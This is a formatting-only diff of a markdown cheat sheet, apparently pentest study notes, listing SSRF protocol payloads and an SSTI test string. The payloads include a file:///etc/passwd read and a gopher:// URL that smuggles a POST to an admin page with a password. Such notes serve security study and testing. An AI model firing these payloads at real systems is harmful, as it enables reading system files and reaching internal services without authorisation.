@@ -9,16 +9,16 @@
 
 #### Protocols
 
-| Protocol    | Example                                                                                                                                                                                              |
+| Protocol | Example |
 | ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `http://`   | `http://127.0.0.1/`                                                                                                                                                                                  |
-| `file://`   | `file:///etc/passwd`                                                                                                                                                                                 |
+| `http://` | `http://127.0.0.1/` |
+| `file://` | `file:///etc/passwd` |
 | `gopher://` | `gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin` |
 
 
 ### **SSTI (Server-Side Template Injection)**
 
-| Category     | Example                                         |
+| Category | Example |
 | ------------ | ----------------------------------------------- |
 | Exploitation | Templating Engines dynamically generate content |
-| Test String  | `${{<%[%'"}}%\.`                                |
+| Test String | `${{<%[%'"}}%\.` |
